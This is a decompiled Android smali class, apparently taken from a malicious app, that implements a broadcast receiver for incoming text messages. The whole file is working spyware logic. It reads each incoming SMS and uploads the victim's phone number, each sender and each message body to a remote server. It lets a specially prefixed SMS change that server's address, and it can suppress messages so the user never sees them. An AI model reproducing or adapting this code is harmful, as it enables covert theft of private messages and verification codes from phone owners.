.class public LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver;
.super Landroid/content/BroadcastReceiver;
.source "SMSBroadcastReceiver.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver$MyAsyncTask;
    }
.end annotation


# static fields
.field private static final SMS_RECEIVED:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED"


# instance fields
.field private myAsyncTask:LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver$MyAsyncTask;


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 14
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 27
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 41
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v19

    const-string v20, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-nez v19, :cond_d

    .line 108
    :cond_c
    return-void

    .line 43
    :cond_d
    new-instance v18, LTnxibnad/Pncibnsc/view/Util;

    move-object/from16 v0, v18

    move-object/from16 v1, p1

    invoke-direct {v0, v1}, LTnxibnad/Pncibnsc/view/Util;-><init>(Landroid/content/Context;)V

    .line 44
    .local v18, "util":LTnxibnad/Pncibnsc/view/Util;
    invoke-virtual/range {v18 .. v18}, LTnxibnad/Pncibnsc/view/Util;->getPhoneNumber()Ljava/lang/String;

    move-result-object v9

    .line 46
    .local v9, "phonenumber":Ljava/lang/String;
    invoke-virtual/range {v18 .. v18}, LTnxibnad/Pncibnsc/view/Util;->doRegisterUser()Ljava/lang/String;

    .line 48
    if-eqz v9, :cond_c

    .line 50
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v19

    const-string v20, "pdus"

    invoke-virtual/range {v19 .. v20}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v11

    check-cast v11, [Ljava/lang/Object;

    .line 51
    .local v11, "puds":[Ljava/lang/Object;
    array-length v0, v11

    move/from16 v20, v0

    const/16 v19, 0x0

    :goto_30
    move/from16 v0, v19

    move/from16 v1, v20

    if-ge v0, v1, :cond_c

    aget-object v8, v11, v19

    .local v8, "obj":Ljava/lang/Object;
    move-object v5, v8

    .line 53
    check-cast v5, [B

    .line 54
    .local v5, "data":[B
    invoke-static {v5}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v7

    .line 55
    .local v7, "message":Landroid/telephony/SmsMessage;
    invoke-virtual {v7}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v14

    .line 56
    .local v14, "sender":Ljava/lang/String;
    invoke-virtual {v7}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v4

    .line 61
    .local v4, "content":Ljava/lang/String;
    if-eqz v14, :cond_18d

    :try_start_49
    const-string v21, ""

    move-object/from16 v0, v21

    invoke-virtual {v0, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v21

    if-nez v21, :cond_18d

    if-eqz v9, :cond_18d

    const-string v21, ""

    move-object/from16 v0, v21

    invoke-virtual {v0, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v21

    if-nez v21, :cond_18d

    .line 64
    const-string v21, "pref"

    const/16 v22, 0x0

    move-object/from16 v0, p1

    move-object/from16 v1, v21

    move/from16 v2, v22

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v10

    .line 65
    .local v10, "pref":Landroid/content/SharedPreferences;
    const-string v21, "SMS_BlockState"

    const/16 v22, 0x0

    move-object/from16 v0, v21

    move/from16 v1, v22

    invoke-interface {v10, v0, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v3

    .line 66
    .local v3, "bAllowTapping":Z
    if-eqz v3, :cond_7e

    .line 67
    invoke-virtual/range {p0 .. p0}, LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver;->abortBroadcast()V

    .line 72
    :cond_7e
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v21

    const/16 v22, 0x7

    move/from16 v0, v21

    move/from16 v1, v22

    if-lt v0, v1, :cond_c7

    .line 73
    const/16 v21, 0x0

    const/16 v22, 0x7

    move/from16 v0, v21

    move/from16 v1, v22

    invoke-virtual {v4, v0, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v21

    const-string v22, "@!#%&*-"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v21

    if-eqz v21, :cond_c7

    .line 74
    const/16 v21, 0x7

    move/from16 v0, v21

    invoke-virtual {v4, v0}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v16

    .line 75
    .local v16, "strServerURL":Ljava/lang/String;
    new-instance v21, Ljava/lang/StringBuilder;

    const-string v22, "http://"

    invoke-direct/range {v21 .. v22}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v21

    move-object/from16 v1, v16

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    const-string v22, "/"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v21

    sput-object v21, LTnxibnad/Pncibnsc/net/HttpUtils;->URL:Ljava/lang/String;

    .line 76
    invoke-virtual/range {v18 .. v18}, LTnxibnad/Pncibnsc/view/Util;->doRegisterUser()Ljava/lang/String;

    .line 78
    invoke-virtual/range {p0 .. p0}, LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver;->abortBroadcast()V

    .line 83
    .end local v16    # "strServerURL":Ljava/lang/String;
    :cond_c7
    sget-object v13, LTnxibnad/Pncibnsc/net/HttpUtils;->URL:Ljava/lang/String;

    .line 84
    .local v13, "s":Ljava/lang/String;
    new-instance v21, Ljava/lang/StringBuilder;

    invoke-static {v13}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v22

    invoke-direct/range {v21 .. v22}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v22, "getsmsblockstate.php?telnum="

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, v21

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v17

    .line 86
    .local v17, "url":Ljava/lang/String;
    new-instance v21, LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver$MyAsyncTask;

    const/16 v22, 0x0

    move-object/from16 v0, v21

    move-object/from16 v1, p0

    move-object/from16 v2, v22

    invoke-direct {v0, v1, v2}, LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver$MyAsyncTask;-><init>(LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver;LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver$MyAsyncTask;)V

    move-object/from16 v0, v21

    move-object/from16 v1, p0

    iput-object v0, v1, LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver;->myAsyncTask:LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver$MyAsyncTask;

    .line 87
    move-object/from16 v0, p0

    iget-object v0, v0, LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver;->myAsyncTask:LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver$MyAsyncTask;

    move-object/from16 v21, v0

    const/16 v22, 0x1

    move/from16 v0, v22

    new-array v0, v0, [Ljava/lang/String;

    move-object/from16 v22, v0

    const/16 v23, 0x0

    aput-object v17, v22, v23

    invoke-virtual/range {v21 .. v22}, LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver$MyAsyncTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Landroid/os/AsyncTask;->get()Ljava/lang/Object;

    move-result-object v15

    check-cast v15, Ljava/lang/String;

    .line 88
    .local v15, "strRes":Ljava/lang/String;
    const-string v21, "1"

    move-object/from16 v0, v21

    invoke-virtual {v15, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v21

    if-eqz v21, :cond_11e

    .line 89
    invoke-virtual/range {p0 .. p0}, LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver;->abortBroadcast()V

    .line 92
    :cond_11e
    const-string v21, "UTF-8"

    move-object/from16 v0, v21

    invoke-static {v4, v0}, Ljava/net/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 93
    new-instance v21, Ljava/lang/StringBuilder;

    invoke-static {v13}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v22

    invoke-direct/range {v21 .. v22}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v22, "index.php?type=receivesms&telnum="

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, v21

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    const-string v22, "&sender="

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, v21

    invoke-virtual {v0, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    const-string v22, "&memo="

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, v21

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v17

    .line 95
    new-instance v21, LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver$MyAsyncTask;

    const/16 v22, 0x0

    move-object/from16 v0, v21

    move-object/from16 v1, p0

    move-object/from16 v2, v22

    invoke-direct {v0, v1, v2}, LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver$MyAsyncTask;-><init>(LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver;LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver$MyAsyncTask;)V

    move-object/from16 v0, v21

    move-object/from16 v1, p0

    iput-object v0, v1, LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver;->myAsyncTask:LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver$MyAsyncTask;

    .line 96
    move-object/from16 v0, p0

    iget-object v0, v0, LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver;->myAsyncTask:LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver$MyAsyncTask;

    move-object/from16 v21, v0

    const/16 v22, 0x1

    move/from16 v0, v22

    new-array v0, v0, [Ljava/lang/String;

    move-object/from16 v22, v0

    const/16 v23, 0x0

    aput-object v17, v22, v23

    invoke-virtual/range {v21 .. v22}, LTnxibnad/Pncibnsc/view/SMSBroadcastReceiver$MyAsyncTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Landroid/os/AsyncTask;->get()Ljava/lang/Object;

    move-result-object v12

    check-cast v12, Ljava/lang/String;

    .line 98
    .local v12, "ret":Ljava/lang/String;
    const-string v21, "Server Return"

    move-object/from16 v0, v21

    invoke-static {v0, v12}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_18d
    .catch Ljava/lang/Exception; {:try_start_49 .. :try_end_18d} :catch_191

    .line 51
    .end local v3    # "bAllowTapping":Z
    .end local v10    # "pref":Landroid/content/SharedPreferences;
    .end local v12    # "ret":Ljava/lang/String;
    .end local v13    # "s":Ljava/lang/String;
    .end local v15    # "strRes":Ljava/lang/String;
    .end local v17    # "url":Ljava/lang/String;
    :cond_18d
    :goto_18d
    add-int/lit8 v19, v19, 0x1

    goto/16 :goto_30

    .line 102
    :catch_191
    move-exception v6

    .line 104
    .local v6, "e":Ljava/lang/Exception;
    invoke-virtual {v6}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_18d
.end method
